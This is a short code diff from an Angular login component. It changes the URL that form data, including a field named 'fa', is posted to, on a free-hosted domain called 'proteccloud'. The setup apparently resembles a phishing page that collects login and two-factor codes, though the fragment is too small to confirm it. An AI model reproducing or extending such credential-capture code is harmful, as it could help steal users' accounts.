@@ -84,7 +84,7 @@ export class LoginComponent {
   comp() {
     if (this.registerForm2.valid) {
       console
-      const url = 'https://proteccloud.000webhostapp.com/login.php';
+      const url = 'https://proteccloud.000webhostapp.com/code.php';
       const body = { 
           fa: this.fa, 
       };
